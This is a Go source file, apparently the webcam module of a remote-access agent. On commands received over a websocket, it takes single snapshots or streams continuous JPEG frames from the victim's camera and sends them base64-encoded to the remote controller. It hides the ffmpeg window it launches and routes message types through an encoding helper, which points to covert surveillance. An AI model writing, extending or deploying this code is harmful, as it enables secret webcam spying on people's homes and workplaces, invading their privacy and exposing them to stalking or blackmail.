package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// ══════════════════════════════════════
//  摄像头模块 — ffmpeg 方式跨平台采帧
// ══════════════════════════════════════

var webcamManager struct {
	mu        sync.Mutex
	streaming bool
	stopCh    chan struct{}
}

// handleWebcamSnap 单帧抓拍
func handleWebcamSnap(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	// 优先尝试原生采集（不依赖 ffmpeg）
	jpgData, w, h, err := captureFrameNative()
	if err == nil {
		sendWebcamResult(conn, writeMu, msg.ID, "webcam_snap_result", jpgData, w, h, "")
		return
	}
	nativeErr := err.Error()

	// 原生失败，回退到 ffmpeg
	device := findWebcamDevice()
	if device == "" {
		sendWebcamResult(conn, writeMu, msg.ID, "webcam_snap_result", nil, 0, 0,
			fmt.Sprintf("原生采集: %s; ffmpeg不可用", nativeErr))
		return
	}

	jpgData, w, h, err = captureOneFrameFFmpeg(device)
	if err != nil {
		sendWebcamResult(conn, writeMu, msg.ID, "webcam_snap_result", nil, 0, 0, err.Error())
		return
	}
	sendWebcamResult(conn, writeMu, msg.ID, "webcam_snap_result", jpgData, w, h, "")
}

// handleWebcamStart 开始持续采帧
func handleWebcamStart(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	webcamManager.mu.Lock()
	if webcamManager.streaming {
		webcamManager.mu.Unlock()
		payload, _ := json.Marshal(map[string]string{"status": "already_running"})
		resp, _ := json.Marshal(AgentMessage{Type: c2e("webcam_start_result"), ID: msg.ID, Payload: payload})
		writeMu.Lock()
		conn.WriteMessage(websocket.TextMessage, resp)
		writeMu.Unlock()
		return
	}
	webcamManager.streaming = true
	webcamManager.stopCh = make(chan struct{})
	webcamManager.mu.Unlock()

	payload, _ := json.Marshal(map[string]string{"status": "started"})
	resp, _ := json.Marshal(AgentMessage{Type: c2e("webcam_start_result"), ID: msg.ID, Payload: payload})
	writeMu.Lock()
	conn.WriteMessage(websocket.TextMessage, resp)
	writeMu.Unlock()

	go webcamStreamLoop(conn, writeMu)
}

// handleWebcamStop 停止采帧
func handleWebcamStop(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	webcamManager.mu.Lock()
	if webcamManager.streaming && webcamManager.stopCh != nil {
		close(webcamManager.stopCh)
		webcamManager.streaming = false
	}
	webcamManager.mu.Unlock()

	payload, _ := json.Marshal(map[string]string{"status": "stopped"})
	resp, _ := json.Marshal(AgentMessage{Type: c2e("webcam_stop_result"), ID: msg.ID, Payload: payload})
	writeMu.Lock()
	conn.WriteMessage(websocket.TextMessage, resp)
	writeMu.Unlock()
}

// webcamStreamLoop 持续采帧循环
func webcamStreamLoop(conn *websocket.Conn, writeMu *sync.Mutex) {
	defer func() {
		webcamManager.mu.Lock()
		webcamManager.streaming = false
		webcamManager.mu.Unlock()
	}()

	stopCh := webcamManager.stopCh

	// 优先使用原生采集（Windows avicap32，无需 ffmpeg）
	if tryNativeWebcamStream(conn, writeMu, stopCh) {
		return
	}

	// 回退到 ffmpeg
	device := findWebcamDevice()
	if device == "" {
		// 两种采集方式都失败，通知前端
		errPayload, _ := json.Marshal(map[string]string{"error": "原生采集失败且ffmpeg不可用"})
		errResp, _ := json.Marshal(AgentMessage{Type: c2e("webcam_frame"), Payload: errPayload})
		writeMu.Lock()
		conn.WriteMessage(websocket.TextMessage, errResp)
		writeMu.Unlock()
		return
	}

	for {
		select {
		case <-stopCh:
			return
		default:
		}

		jpgData, w, h, err := captureOneFrameFFmpeg(device)
		if err != nil {
			time.Sleep(500 * time.Millisecond)
			continue
		}

		b64 := base64.StdEncoding.EncodeToString(jpgData)
		framePayload, _ := json.Marshal(map[string]interface{}{
			"image":  b64,
			"width":  w,
			"height": h,
			"size":   len(jpgData),
		})
		resp, _ := json.Marshal(AgentMessage{Type: c2e("webcam_frame"), Payload: framePayload})
		writeMu.Lock()
		conn.WriteMessage(websocket.TextMessage, resp)
		writeMu.Unlock()

		time.Sleep(100 * time.Millisecond) // ~10 FPS
	}
}

// captureOneFrame 先尝试原生采集，失败则 ffmpeg
func captureOneFrame(device string) (jpgData []byte, width, height int, err error) {
	if jpgData, width, height, err = captureFrameNative(); err == nil {
		return
	}
	return captureOneFrameFFmpeg(device)
}

// captureOneFrameFFmpeg 使用 ffmpeg 抓取单帧 JPEG
func captureOneFrameFFmpeg(device string) (jpgData []byte, width, height int, err error) {
	var args []string
	if runtime.GOOS == "windows" {
		args = []string{
			"-f", "dshow",
			"-rtbufsize", "10M",
			"-i", fmt.Sprintf("video=%s", device),
			"-frames:v", "1",
			"-f", "image2pipe",
			"-vcodec", "mjpeg",
			"-q:v", "8",
			"-",
		}
	} else {
		args = []string{
			"-f", "v4l2",
			"-i", device,
			"-frames:v", "1",
			"-f", "image2pipe",
			"-vcodec", "mjpeg",
			"-q:v", "8",
			"-",
		}
	}

	cmd := exec.Command("ffmpeg", args...)
	hideWindow(cmd)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	if err = cmd.Run(); err != nil {
		errMsg := stderr.String()
		// 取最后一行有用的错误信息
		lines := strings.Split(strings.TrimSpace(errMsg), "\n")
		if len(lines) > 0 {
			return nil, 0, 0, fmt.Errorf("ffmpeg: %s", lines[len(lines)-1])
		}
		return nil, 0, 0, fmt.Errorf("ffmpeg执行失败: %v", err)
	}

	jpgData = stdout.Bytes()
	if len(jpgData) == 0 {
		return nil, 0, 0, fmt.Errorf("ffmpeg未输出数据")
	}

	// 从 ffmpeg stderr 解析分辨率 (格式: "Stream ... Video: mjpeg ... 640x480")
	width, height = 640, 480
	stderrStr := stderr.String()
	if idx := strings.Index(stderrStr, "Video:"); idx >= 0 {
		sub := stderrStr[idx:]
		// 查找 NNNxNNN 模式
		for i := 0; i < len(sub)-2; i++ {
			if sub[i] >= '0' && sub[i] <= '9' {
				j := i
				for j < len(sub) && sub[j] >= '0' && sub[j] <= '9' {
					j++
				}
				if j < len(sub) && sub[j] == 'x' {
					k := j + 1
					for k < len(sub) && sub[k] >= '0' && sub[k] <= '9' {
						k++
					}
					if k > j+1 {
						wStr := sub[i:j]
						hStr := sub[j+1 : k]
						var ww, hh int
						fmt.Sscanf(wStr, "%d", &ww)
						fmt.Sscanf(hStr, "%d", &hh)
						if ww >= 160 && ww <= 4096 && hh >= 120 && hh <= 4096 {
							width, height = ww, hh
							break
						}
					}
				}
			}
		}
	}

	return jpgData, width, height, nil
}

// findWebcamDevice 检测可用摄像头设备名
func findWebcamDevice() string {
	if runtime.GOOS == "windows" {
		return findWebcamDeviceWindows()
	}
	return findWebcamDeviceLinux()
}

func findWebcamDeviceWindows() string {
	// 使用 ffmpeg 列出 DirectShow 设备
	cmd := exec.Command("ffmpeg", "-list_devices", "true", "-f", "dshow", "-i", "dummy")
	hideWindow(cmd)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	cmd.Run() // 此命令总是返回非零，忽略错误

	output := stderr.String()
	lines := strings.Split(output, "\n")
	foundVideo := false
	for _, line := range lines {
		line = strings.TrimSpace(line)
		// DirectShow 设备列表格式:
		// [dshow @ ...] "USB Camera" (video)
		// [dshow @ ...]  DirectShow video devices:
		if strings.Contains(line, "DirectShow video devices") {
			foundVideo = true
			continue
		}
		if strings.Contains(line, "DirectShow audio devices") {
			break
		}
		if foundVideo && strings.Contains(line, "\"") {
			// 提取引号中的设备名
			start := strings.Index(line, "\"")
			if start >= 0 {
				end := strings.Index(line[start+1:], "\"")
				if end >= 0 {
					deviceName := line[start+1 : start+1+end]
					if deviceName != "" && !strings.Contains(strings.ToLower(deviceName), "alternative") {
						log.Printf("检测到摄像头: %s", deviceName)
						return deviceName
					}
				}
			}
		}
	}
	return ""
}

func findWebcamDeviceLinux() string {
	// 检查 /dev/video0 是否存在
	for i := 0; i < 4; i++ {
		dev := fmt.Sprintf("/dev/video%d", i)
		cmd := exec.Command("test", "-e", dev)
		if cmd.Run() == nil {
			return dev
		}
	}
	// 也可以使用 v4l2-ctl --list-devices
	cmd := exec.Command("v4l2-ctl", "--list-devices")
	var out bytes.Buffer
	cmd.Stdout = &out
	if cmd.Run() == nil {
		lines := strings.Split(out.String(), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "/dev/video") {
				return line
			}
		}
	}
	return ""
}

func sendWebcamResult(conn *websocket.Conn, writeMu *sync.Mutex, id, msgType string, jpgData []byte, w, h int, errMsg string) {
	var result map[string]interface{}
	if errMsg != "" {
		result = map[string]interface{}{"error": errMsg}
	} else {
		b64 := base64.StdEncoding.EncodeToString(jpgData)
		result = map[string]interface{}{
			"image":  b64,
			"width":  w,
			"height": h,
			"size":   len(jpgData),
		}
	}
	payload, _ := json.Marshal(result)
	resp, _ := json.Marshal(AgentMessage{Type: c2e(msgType), ID: id, Payload: payload})
	writeMu.Lock()
	conn.WriteMessage(websocket.TextMessage, resp)
	writeMu.Unlock()
}
